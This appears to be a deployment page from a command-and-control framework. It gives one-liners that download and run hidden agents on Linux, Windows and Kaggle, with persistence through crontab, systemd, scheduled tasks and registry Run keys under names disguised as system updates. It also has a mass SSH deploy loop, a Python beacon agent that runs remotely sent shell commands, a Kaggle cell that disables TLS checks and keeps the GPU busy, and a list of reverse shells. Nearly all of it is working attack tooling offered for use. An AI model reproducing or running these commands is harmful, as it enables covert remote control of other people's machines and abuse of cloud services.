🐧 Linux Agent (Python)

Linux / Unix

Works on any Linux/Unix with Python 3 (stdlib only, no pip needed). Persistent via crontab or systemd.

One-Liner (curl):

curl -sL -H 'User-Agent: Mozilla/5.0' …/agents/agent_linux.py -o /tmp/.a.py && python3 /tmp/.a.py &

One-Liner (python only, no curl):

python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('…/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &

Silent background (nohup):

nohup python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('…/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" >/dev/null 2>&1 &

With crontab persistence (auto-restart on reboot):

python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('…/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" & (crontab -l 2>/dev/null; echo "@reboot python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('…/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())\" >/dev/null 2>&1 &") | crontab -

With systemd persistence (service, survives reboot):

curl -sL -H 'User-Agent: Mozilla/5.0' '…/agents/agent_linux.py' -o /opt/.sys-update.py cat > /tmp/.svc.service <<'EOF' [Unit] Description=System Update After=network.target [Service] ExecStart=python3 /opt/.sys-update.py Restart=always RestartSec=30 [Install] WantedBy=multi-user.target EOF sudo cp /tmp/.svc.service /etc/systemd/system/sys-update.service 2>/dev/null \ && sudo systemctl daemon-reload && sudo systemctl enable --now sys-update \ || (mkdir -p ~/.config/systemd/user && cp /tmp/.svc.service ~/.config/systemd/user/ && systemctl --user daemon-reload && systemctl --user enable --now sys-update) python3 /opt/.sys-update.py &

Mass SSH deploy (targets.txt — one IP per line):

while read ip; do ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 user@$ip \ "nohup python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('…/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())\" >/dev/null 2>&1 &" & done < targets.txt; wait

🪟 Windows Agent (PowerShell)

Windows

PowerShell agent — works on Windows 7+ with .NET 4+. No dependencies required.

PowerShell one-liner (hidden window):

powershell -ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';IEX($w.DownloadString('…/agents/agent_windows.ps1'))"

Via CMD (start/b — detached process):

cmd /c "start /b powershell -ep bypass -w hidden -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX((New-Object Net.WebClient).DownloadString('…/agents/agent_windows.ps1'))\""

With Scheduled Task persistence (survives reboot):

powershell -ep bypass -w hidden -c "$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';$w.DownloadFile('…/agents/agent_windows.ps1','$env:APPDATA\wu.ps1');Register-ScheduledTask -TaskName 'WindowsDefenderUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-ep bypass -w hidden -f $env:APPDATA\wu.ps1') -RunLevel Highest -Force;Start-Sleep 1;Start-Process powershell -ArgumentList '-ep bypass -w hidden -f $env:APPDATA\wu.ps1' -WindowStyle Hidden"

Registry Run key persistence:

powershell -ep bypass -w hidden -c "$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';$w.DownloadFile('…/agents/agent_windows.ps1','$env:APPDATA\wu.ps1');Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value 'powershell -ep bypass -w hidden -f $env:APPDATA\wu.ps1';Start-Process powershell -ArgumentList '-ep bypass -w hidden -f $env:APPDATA\wu.ps1' -WindowStyle Hidden"

WMI-based execution (no powershell.exe on PATH):

wmic process call create "powershell -ep bypass -w hidden -c \"IEX((New-Object Net.WebClient).DownloadString('…/agents/agent_windows.ps1'))\"" 2>nul

import urllib.request as u, threading, os, json, platform, socket, uuid, subprocess, time C2 = "…" AID = str(uuid.uuid4()) def _post(p, d): req = u.Request(f"{C2}{p}", json.dumps(d).encode(), {"Content-Type":"application/json","User-Agent":"Mozilla/5.0"}) return json.loads(u.urlopen(req, timeout=15).read()) def _beacon(): while True: try: for t in _post("/api/agent/beacon",{"id":AID}).get("tasks",[]): try: r = subprocess.check_output(t["payload"],shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors="replace") if t["task_type"]=="cmd" else "ok" _post("/api/agent/result",{"task_id":t["id"],"result":r[:65000]}) except Exception as e: _post("/api/agent/result",{"task_id":t["id"],"result":str(e)}) except: pass time.sleep(5) _post("/api/agent/register",{"id":AID,"hostname":f"colab-{socket.gethostname()}","username":os.popen("whoami").read().strip(),"os":f"Colab {platform.system()}","arch":platform.machine(),"ip_internal":socket.gethostbyname(socket.gethostname()),"platform_type":"colab"}) threading.Thread(target=_beacon,daemon=True).start() print("Connected:", AID)

📊 Kaggle Kernel Agent

Kaggle

Designed for Kaggle kernels. Uses DNS-over-HTTPS to bypass Kaggle's DNS filtering. Supports persistent GPU sessions.

Notebook cell (recommended):

%%capture import urllib.request as _u, ssl, threading, time ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE from urllib.request import HTTPSHandler, build_opener opener = build_opener(HTTPSHandler(context=ctx)) exec(opener.open(_u.Request('…/agents/kaggle_agent.py', headers={'User-Agent':'Mozilla/5.0'})).read()) # GPU keepalive — prevents idle shutdown def _keepalive(): try: import torch x = torch.ones(1).cuda() while True: _ = x * x # tiny GPU op every 30s time.sleep(30) except Exception: while True: time.sleep(60) threading.Thread(target=_keepalive, daemon=True).start() print("GPU keepalive active")

🔗 Reverse Shells (initial access)

Raw Shell

Use these for quick initial access before deploying a full C2 agent. Replace HOST with your server IP.

Bash:

bash -i >& /dev/tcp/HOST/4444 0>&1

Python:

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("HOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc HOST 4444 >/tmp/f

Netcat OpenBSD:

nc -e /bin/sh HOST 4444

powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('HOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"
